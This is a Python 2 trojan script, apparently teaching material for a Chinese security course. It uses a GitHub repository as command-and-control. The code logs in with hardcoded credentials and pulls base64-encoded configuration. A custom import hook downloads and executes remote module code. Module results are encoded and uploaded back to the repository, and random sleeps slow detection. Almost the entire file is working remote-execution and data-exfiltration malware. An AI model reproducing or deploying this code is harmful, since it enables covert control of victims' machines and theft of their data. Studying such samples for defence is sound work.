#!/usr/bin/python2.7
# -*- coding=utf-8 -*-
#本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
#教主QQ:605658506
#亁颐堂官网www.qytang.com
#乾颐盾是由亁颐堂现任明教教主开发的综合性安全课程
#包括传统网络安全（防火墙，IPS...）与Python语言和黑客渗透课程！

#整个脚本执行的流程是这样的：
'''
get_trojan_config(config文件路径)

get_file_contents(config文件路径)
获取并返回配置文件的内容
导入配置文件中指定的每个模块

find_module(模块名)
找到指定模块，并获取模块的内容，返回self

load_module(模块名)
在find_module返回非None值的时候，加载对应的模块
返回config文件的json格式内容

module_runner(模块名)
多线程运行每个模块，将模块运行的结果用base64编码并且上传到github上
'''

import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
import time

from github3 import login

format_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

trojan_id = "gethash"

trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules = []
configured = False
task_queue = Queue.Queue()

def connect_to_github():#连接到GitHub
	gh = login(username = "hacker9219", password = "Cisc0123")
	repo = gh.repository("hacker9219", "chapter7")
	branch = repo.branch("master")

	return gh, repo, branch

def get_file_contents(filepath):#找到模块
	gh, repo, branch = connect_to_github()
	tree = branch.commit.commit.tree.recurse()

	for filename in tree.tree:
		if filepath in filename.path:
			print "[*] Found file %s" % filepath
			blob = repo.blob(filename._json_data['sha'])
			#print(blob.content)
			return blob.content

	return None

def get_trojan_config():#通过base64 decode模块内容，并且导入模块！
	global configured
	config_json = get_file_contents(trojan_config)
	config = json.loads(base64.b64decode(config_json))
	#print config
	configured = True

	for task in config:
		if task['module'] not in sys.modules:
			print "import %s" % task['module']
			exec("import %s" % task['module'])
	#print(config)
	return config

def store_module_result(data):#保存内容到Github
	gh, repo, branch = connect_to_github()
	remote_path = "data/%s/%s.data" % (trojan_id, format_time)
	repo.create_file(remote_path, "Commit message", base64.b64encode(data))

	return

class GitImporter(object):#一个为sys.meta_path查找并且导入模块的类
	def __init__(self):
		self.current_module_code = ""

	#每次import，不管是否导入成功
	#都会调用find_module函数
	#并且导入的模块名作为fullname参数
	#传入到find_module中
	def find_module(self, fullname, path=None):
		if configured:
			print "[*] Attempting to retrieve %s" % fullname
			new_library = get_file_contents("modules/%s" % fullname)

			if new_library is not None:
				self.current_module_code = base64.b64decode(new_library)
				return self
		return None

	#如果find_module返回值不是None
	#那么就会执行load_module函数
	#传入的name函数也是被导入的模块名
	def load_module(self, name):
		module = imp.new_module(name)
		exec self.current_module_code in module.__dict__
		sys.modules[name] = module

		return module

def module_runner(module):#运行模块并且把结果保存到github
	try:
		task_queue.put(1)
		result = sys.modules[module].run()
		task_queue.get()

		store_module_result(result)
	except:
		pass

	return

#使用sys.meta_path可以通过github和pypi查找并且导入模块
sys.meta_path = [GitImporter()]
#meta_path详解
#http://jelly.codes/articles/python-auto-install-with-meta-path/

while True:
	if task_queue.empty():
		config = get_trojan_config()

		for task in config:
			t = threading.Thread(target=module_runner, args=(task['module'],))
			t.start()
			time.sleep(random.randint(1,10))

	time.sleep(random.randint(10,100))